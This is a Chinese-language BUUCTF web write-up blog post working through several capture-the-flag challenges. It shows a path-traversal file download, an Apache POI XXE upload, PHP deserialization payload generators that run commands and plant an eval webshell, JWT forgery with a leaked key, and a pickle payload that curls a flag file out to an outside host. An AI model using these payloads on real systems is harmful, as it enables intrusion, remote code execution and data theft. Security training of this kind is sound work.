---
title: "BUUCTF Web Writeup 10"
date: 2022-12-21T17:14:54+08:00
lastmod: 2022-12-21T17:14:54+08:00
draft: true
author: "X1r0z"

tags: ['ctf']
categories: ['Writeup']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

BUUCTF 刷题记录...

<!--more-->

## [网鼎杯 2020 青龙组]filejava

文件上传路由 `/UploadServlet`, 上传后会返回下载链接

```
/DownloadServlet?filename=c41257bd-c13b-41c2-95c6-f74ffd733c71_2.png
```

存在任意文件下载, 将 fiename 置空能得到 tomcat 报错信息

![image-20221221172210952](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212211722992.png)

报错信息中泄露了物理路径, 然后目录穿越到 WEB-INF 目录下载 web.xml

```
/DownloadServlet?filename=../../../web.xml
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">
    <servlet>
        <servlet-name>DownloadServlet</servlet-name>
        <servlet-class>cn.abc.servlet.DownloadServlet</servlet-class>
    </servlet>

    <servlet-mapping>
        <servlet-name>DownloadServlet</servlet-name>
        <url-pattern>/DownloadServlet</url-pattern>
    </servlet-mapping>

    <servlet>
        <servlet-name>ListFileServlet</servlet-name>
        <servlet-class>cn.abc.servlet.ListFileServlet</servlet-class>
    </servlet>

    <servlet-mapping>
        <servlet-name>ListFileServlet</servlet-name>
        <url-pattern>/ListFileServlet</url-pattern>
    </servlet-mapping>

    <servlet>
        <servlet-name>UploadServlet</servlet-name>
        <servlet-class>cn.abc.servlet.UploadServlet</servlet-class>
    </servlet>

    <servlet-mapping>
        <servlet-name>UploadServlet</servlet-name>
        <url-pattern>/UploadServlet</url-pattern>
    </servlet-mapping>
</web-app>
```

继续下载对应 servlet

DownloadServlet

```java
import cn.abc.servlet.DownloadServlet;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.net.URLEncoder;
import javax.servlet.ServletException;
import javax.servlet.ServletOutputStream;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class DownloadServlet extends HttpServlet {
  private static final long serialVersionUID = 1L;
  
  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
    doPost(request, response);
  }
  
  protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
    String fileName = request.getParameter("filename");
    fileName = new String(fileName.getBytes("ISO8859-1"), "UTF-8");
    System.out.println("filename=" + fileName);
    if (fileName != null && fileName.toLowerCase().contains("flag")) {
      request.setAttribute("message", ");
      request.getRequestDispatcher("/message.jsp").forward((ServletRequest)request, (ServletResponse)response);
      return;
    } 
    String fileSaveRootPath = getServletContext().getRealPath("/WEB-INF/upload");
    String path = findFileSavePathByFileName(fileName, fileSaveRootPath);
    File file = new File(path + "/" + fileName);
    if (!file.exists()) {
      request.setAttribute("message", ");
      request.getRequestDispatcher("/message.jsp").forward((ServletRequest)request, (ServletResponse)response);
      return;
    } 
    String realname = fileName.substring(fileName.indexOf("_") + 1);
    response.setHeader("content-disposition", "attachment;filename=" + URLEncoder.encode(realname, "UTF-8"));
    FileInputStream in = new FileInputStream(path + "/" + fileName);
    ServletOutputStream out = response.getOutputStream();
    byte[] buffer = new byte[1024];
    int len = 0;
    while ((len = in.read(buffer)) > 0)
      out.write(buffer, 0, len); 
    in.close();
    out.close();
  }
  
  public String findFileSavePathByFileName(String filename, String saveRootPath) {
    int hashCode = filename.hashCode();
    int dir1 = hashCode & 0xF;
    int dir2 = (hashCode & 0xF0) >> 4;
    String dir = saveRootPath + "/" + dir1 + "/" + dir2;
    File file = new File(dir);
    if (!file.exists())
      file.mkdirs(); 
    return dir;
  }
}
```

ListFileServlet

```java
import cn.abc.servlet.ListFileServlet;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class ListFileServlet extends HttpServlet {
  private static final long serialVersionUID = 1L;
  
  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
    doPost(request, response);
  }
  
  protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
    String uploadFilePath = getServletContext().getRealPath("/WEB-INF/upload");
    Map<String, String> fileNameMap = new HashMap<>();
    String saveFilename = (String)request.getAttribute("saveFilename");
    String filename = (String)request.getAttribute("filename");
    System.out.println("saveFilename" + saveFilename);
    System.out.println("filename" + filename);
    String realName = saveFilename.substring(saveFilename.indexOf("_") + 1);
    fileNameMap.put(saveFilename, filename);
    request.setAttribute("fileNameMap", fileNameMap);
    request.getRequestDispatcher("/listfile.jsp").forward((ServletRequest)request, (ServletResponse)response);
  }
}
```

UploadServlet

```java
import cn.abc.servlet.UploadServlet;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.List;
import java.util.UUID;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.apache.commons.fileupload.FileItem;
import org.apache.commons.fileupload.FileItemFactory;
import org.apache.commons.fileupload.FileUploadException;
import org.apache.commons.fileupload.disk.DiskFileItemFactory;
import org.apache.commons.fileupload.servlet.ServletFileUpload;
import org.apache.poi.openxml4j.exceptions.InvalidFormatException;
import org.apache.poi.ss.usermodel.Sheet;
import org.apache.poi.ss.usermodel.Workbook;
import org.apache.poi.ss.usermodel.WorkbookFactory;

public class UploadServlet extends HttpServlet {
  private static final long serialVersionUID = 1L;
  
  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
    doPost(request, response);
  }
  
  protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
    String savePath = getServletContext().getRealPath("/WEB-INF/upload");
    String tempPath = getServletContext().getRealPath("/WEB-INF/temp");
    File tempFile = new File(tempPath);
    if (!tempFile.exists())
      tempFile.mkdir(); 
    String message = "";
    try {
      DiskFileItemFactory factory = new DiskFileItemFactory();
      factory.setSizeThreshold(102400);
      factory.setRepository(tempFile);
      ServletFileUpload upload = new ServletFileUpload((FileItemFactory)factory);
      upload.setHeaderEncoding("UTF-8");
      upload.setFileSizeMax(1048576L);
      upload.setSizeMax(10485760L);
      if (!ServletFileUpload.isMultipartContent(request))
        return; 
      List<FileItem> list = upload.parseRequest(request);
      for (FileItem fileItem : list) {
        if (fileItem.isFormField()) {
          String name = fileItem.getFieldName();
          String str = fileItem.getString("UTF-8");
          continue;
        } 
        String filename = fileItem.getName();
        if (filename == null || filename.trim().equals(""))
          continue; 
        String fileExtName = filename.substring(filename.lastIndexOf(".") + 1);
        InputStream in = fileItem.getInputStream();
        if (filename.startsWith("excel-") && "xlsx".equals(fileExtName))
          try {
            Workbook wb1 = WorkbookFactory.create(in);
            Sheet sheet = wb1.getSheetAt(0);
            System.out.println(sheet.getFirstRowNum());
          } catch (InvalidFormatException e) {
            System.err.println("poi-ooxml-3.10 has something wrong");
            e.printStackTrace();
          }  
        String saveFilename = makeFileName(filename);
        request.setAttribute("saveFilename", saveFilename);
        request.setAttribute("filename", filename);
        String realSavePath = makePath(saveFilename, savePath);
        FileOutputStream out = new FileOutputStream(realSavePath + "/" + saveFilename);
        byte[] buffer = new byte[1024];
        int len = 0;
        while ((len = in.read(buffer)) > 0)
          out.write(buffer, 0, len); 
        in.close();
        out.close();
        message = ";
      } 
    } catch (FileUploadException e) {
      e.printStackTrace();
    } 
    request.setAttribute("message", message);
    request.getRequestDispatcher("/ListFileServlet").forward((ServletRequest)request, (ServletResponse)response);
  }
  
  private String makeFileName(String filename) {
    return UUID.randomUUID().toString() + "_" + filename;
  }
  
  private String makePath(String filename, String savePath) {
    int hashCode = filename.hashCode();
    int dir1 = hashCode & 0xF;
    int dir2 = (hashCode & 0xF0) >> 4;
    String dir = savePath + "/" + dir1 + "/" + dir2;
    File file = new File(dir);
    if (!file.exists())
      file.mkdirs(); 
    return dir;
  }
}
```

在 UploadServlet 中会检测上传的文件是否为 excel 表格, 然后会调用 WorkbookFactory 去解析表格内容 

网上搜了一下发现组件是 apache poi, 存在 xxe 漏洞

参考文章: [https://xz.aliyun.com/t/6996](https://xz.aliyun.com/t/6996)

随便新建一个 xlsx 文件, 然后更改 `[Content_Types].xml` 的内容为 blind xxe payload, 最后上传即可

![image-20221221172811730](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212211728811.png)

## [2020 新春红包题]1

```php
<?php
error_reporting(0);

class A {

    protected $store;

    protected $key;

    protected $expire;

    public function __construct($store, $key = 'flysystem', $expire = null) {
        $this->key = $key;
        $this->store = $store;
        $this->expire = $expire;
    }

    public function cleanContents(array $contents) {
        $cachedProperties = array_flip([
            'path', 'dirname', 'basename', 'extension', 'filename',
            'size', 'mimetype', 'visibility', 'timestamp', 'type',
        ]);

        foreach ($contents as $path => $object) {
            if (is_array($object)) {
                $contents[$path] = array_intersect_key($object, $cachedProperties);
            }
        }

        return $contents;
    }

    public function getForStorage() {
        $cleaned = $this->cleanContents($this->cache);

        return json_encode([$cleaned, $this->complete]);
    }

    public function save() {
        $contents = $this->getForStorage();

        $this->store->set($this->key, $contents, $this->expire);
    }

    public function __destruct() {
        if (!$this->autosave) {
            $this->save();
        }
    }
}

class B {

    protected function getExpireTime($expire): int {
        return (int) $expire;
    }

    public function getCacheKey(string $name): string {
        // 使缓存文件名随机
        $cache_filename = $this->options['prefix'] . uniqid() . $name;
        if(substr($cache_filename, -strlen('.php')) === '.php') {
          die('?');
        }
        return $cache_filename;
    }

    protected function serialize($data): string {
        if (is_numeric($data)) {
            return (string) $data;
        }

        $serialize = $this->options['serialize'];

        return $serialize($data);
    }

    public function set($name, $value, $expire = null): bool{
        $this->writeTimes++;

        if (is_null($expire)) {
            $expire = $this->options['expire'];
        }

        $expire = $this->getExpireTime($expire);
        $filename = $this->getCacheKey($name);

        $dir = dirname($filename);

        if (!is_dir($dir)) {
            try {
                mkdir($dir, 0755, true);
            } catch (\Exception $e) {
                // 创建失败
            }
        }

        $data = $this->serialize($value);

        if ($this->options['data_compress'] && function_exists('gzcompress')) {
            //数据压缩
            $data = gzcompress($data, 3);
        }

        $data = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;
        $result = file_put_contents($filename, $data);

        if ($result) {
            return $filename;
        }

        return null;
    }

}

if (isset($_GET['src']))
{
    highlight_file(__FILE__);
}

$dir = "uploads/";

if (!is_dir($dir))
{
    mkdir($dir);
}
unserialize($_GET["data"]);
```

跟之前有一题一模一样, 但 getCacheKey 方法改了一下

参考文章 (才发现是 thinkphp 的链子...)

[https://www.anquanke.com/post/id/194036](https://www.anquanke.com/post/id/194036)

[https://www.zhaoj.in/read-6397.html](https://www.zhaoj.in/read-6397.html)

新学到的两个思路

第一个思路是利用 linux 中反引号的优先级来执行命令

```php
<?php

class A {

    protected $store;
    protected $key;
    protected $expire;

    public function __construct($store, $key = 'flysystem', $expire = null) {
        $this->key = $key;
        $this->store = $store;
        $this->expire = $expire;
    }

}

class B {

}

$b = new B();
$b->options = array(
    'expire' => '123',
    'prefix' => '456',
    'serialize' => 'system'
);

$a = new A($b, '789', null);
$a->autosave = false;
$a->cache = [];
$a->complete = '`cat /flag > /var/www/html/flag.txt`';

echo urlencode(serialize($a));
```

serialize 指定为 system

虽然传入的参数里面包含了 json, 但由于反引号的优先级较高, 仍然是可以执行任意命令 (无回显)

第二个思路是利用 linux 目录穿越来绕过随机字符的限制, 以及通过 `/.` 绕过 `.php` 后缀检测创建文件

```php
<?php

class A {

    protected $store;
    protected $key;
    protected $expire;

    public function __construct($store, $key = 'flysystem', $expire = null) {
        $this->key = $key;
        $this->store = $store;
        $this->expire = $expire;
    }

}

class B {

}

$b = new B();
$b->options = array(
    'expire' => '123',
    'prefix' => 'php://filter/write=convert.base64-decode/resource=uploads/',
    'serialize' => 'strval'
);

$a = new A($b, '/../shell.php/.', null);
$a->autosave = false;
$a->cache = [];
$a->complete = 'aaaPD9waHAgZXZhbCgkX1JFUVVFU1RbMTIzNF0pOz8+';

echo urlencode(serialize($a));
```

注意只有 uploads 目录可写, 剩下的构造跟之前那题一模一样

![image-20221221204320195](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212212043335.png)

## [RootersCTF2019]ImgXweb

robots.txt

```
User-agent: * 
Disallow: /static/secretkey.txt
```

访问得到 secret key 为 `you-will-never-guess`

之后随便注册一个用户, 用 secret key 伪造 jwt 指定用户为 admin

然后访问 /home 查看图片源码得到 flag

## [watevrCTF-2019]Pickle Store

cookie session 参数存在 pickle 反序列化

payload

```python
base64.b64encode(b"cos\nsystem\n(S'curl http://x.x.x.x:yyyy/ -X POST -d \"`cat flag.txt`\"'\ntR.")
```

## [安洵杯 2019]iamthinking

